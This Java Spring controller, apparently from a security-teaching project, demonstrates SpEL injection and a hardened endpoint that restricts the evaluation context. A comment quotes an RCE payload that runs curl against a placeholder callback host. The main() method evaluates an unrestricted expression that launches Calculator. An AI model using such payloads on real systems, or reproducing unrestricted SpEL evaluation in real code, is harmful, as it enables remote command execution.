package org.joychou.controller;

import java.util.Collections;

import org.springframework.expression.EvaluationContext;
import org.springframework.expression.ExpressionParser;
import org.springframework.expression.TypeLocator;
import org.springframework.expression.spel.SpelEvaluationException;
import org.springframework.expression.spel.SpelMessage;
import org.springframework.expression.spel.standard.SpelExpressionParser;
import org.springframework.expression.spel.support.StandardEvaluationContext;
import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RestController;
import org.springframework.web.util.HtmlUtils;


/**
 * SpEL Injection
 *
 * @author JoyChou @2019-01-17
 */
@RestController
public class SpEL {

    /**
     * Creates a restricted EvaluationContext that blocks type references (T()),
     * constructor calls (new), and method invocations on arbitrary types,
     * preventing SpEL injection / RCE.
     */
    private static EvaluationContext createRestrictedContext() {
        StandardEvaluationContext ctx = new StandardEvaluationContext();
        // Remove all method resolvers — no method calls on arbitrary objects
        ctx.setMethodResolvers(Collections.emptyList());
        // Remove all constructor resolvers — no "new" expressions
        ctx.setConstructorResolvers(Collections.emptyList());
        // Block all type lookups — no T(java.lang.Runtime) etc.
        ctx.setTypeLocator(new TypeLocator() {
            @Override
            public Class<?> findType(String typeName) {
                throw new SpelEvaluationException(SpelMessage.TYPE_NOT_FOUND, typeName);
            }
        });
        return ctx;
    }

    /**
     * SpEL to RCE - secured
     * http://localhost:8080/spel/vul/?expression=xxx.
     * xxx is urlencode(exp)
     * exp: T(java.lang.Runtime).getRuntime().exec("curl xxx.ceye.io") will be rejected
     */
    @GetMapping("/spel/vuln")
    public String rce(String expression) {
        ExpressionParser parser = new SpelExpressionParser();
        // Use restricted context: no type references, no constructors, no method calls
        EvaluationContext context = createRestrictedContext();
        String result = parser.parseExpression(expression).getValue(context, String.class);
        return HtmlUtils.htmlEscape(result != null ? result : "");
    }

    public static void main(String[] args) {
        ExpressionParser parser = new SpelExpressionParser();
        String expression = "T(java.lang.Runtime).getRuntime().exec(\"open -a Calculator\")";
        String result = parser.parseExpression(expression).getValue().toString();
        System.out.println(result);
    }
}

